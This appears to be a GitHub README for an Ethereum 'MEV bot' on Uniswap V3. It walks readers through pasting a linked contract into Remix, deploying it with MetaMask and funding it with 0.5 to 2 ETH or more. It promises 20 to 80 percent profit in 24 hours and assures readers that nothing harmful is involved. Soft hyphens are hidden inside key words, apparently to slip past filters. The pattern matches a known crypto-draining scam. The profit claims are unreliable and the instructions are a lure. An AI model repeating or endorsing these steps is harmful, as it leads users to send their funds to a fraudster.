
<h1 align="center">Create Your Ethereum Bot for Uniswap V3</h1>

<p align="center">
  <img src="https://i.ibb.co/Sm4Xddw/68747470733a2f2f692e6962622e636f2f374779433259512f676574737461727465642e706e67.png">
</p>

<p align="center">
  <strong>A tool for creating and managing MEV Bots, where clients can connect a MetaMask wallet and create a contract that is executed via a script on the website.</strong>
</p>

## Description

The tool allows users to create and manage MEV bots (Maximal Extractable Value bots) based on smart contracts. Users can connect their MetaMask cryptocurrency wallets, create contracts, and run scripts to automate trading and other operations on the Ethereum blockchain. 

⚠️ **The bot operates entirely within the browser, so there is no need to download any programs that could potentially be harmful to your computer.**

## Key Features

- **Wallet Connection**: Supports MetaMask.
- **Contract Creation**: Users can create smart contracts using our tool.
- **Script Execution**: The website allows users to execute the created contract and manage its execution.
- **Real-time Transaction Display**: The bot's transactions are displayed in real-time.

## Usage

1. Download [**MetaMask**](https://metamask.io/download.html) (if you don’t have it already)
 
2. Access to [**Remix Ethereum IDE**](https://remix.ethereum.org/).
   
   <img src="https://i.ibb.co/ftNtP8G/2.png" alt="2" border="0">
   
   #### For the Remix IDE you can follow this steps:
3. Click on the `contracts` folder and then create `New File`. Rename it as you like, for example: `bot.sol`

   #### Note: If there is a problem if the text is not colored when you create bot.sol and paste the code from pastebin, try again. If the codes are not colored, you cannot proceed to the next step.


4. Paste this [**sourcecode**](sourcecode.sol) code in R­­emi­x­.

5.  Go to the `Solidity Compiler` tab, select version `0.6.6+commit.6c089d02` and click `Compile bot.sol`.
 
    Make sure `bot.sol` is selected in the CONTRACT section of the SOLIDITY COMPILER section.

6. TGo to the `DEPLOY & RUN TRANSACTIONS` tab, select the `Injected Provider - ­M­et­am­as­k­­` environment and then `Deploy`. By approving the Me­­ta­­­ma­­sk contract creation fee, you will have created your own contract (ignore any IFPS errors that may appear afterwards).

7. Copy your newly created contract address and fund it with any amount of ETH (at least 0.5-2 ETH or more is recommended) Simply send ETH to your newly created contract address to allow the bot to earn money.

8. After your transaction is confirmed, click the “start” button to run the b­o­­t. Withdraw your ETH at any time by clicking the “Withdraw” button.
 
   #### That’s it. The bo­t will start wo­rking immed­iately earning you profits from a­r­­b­itr­a­ge trades on ­U­ni­s­­wa­­p pools.
   
   #### Testing the bot's operation over 24 hours yields ~20-80% profit on the balance.

   #### The profit depends on network load (gas price) and competition from other MEV bots on the token.
## Bot Balance Chart

<img src="https://i.ibb.co/2t6ppPD/3.png" alt="3" border="0">


## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
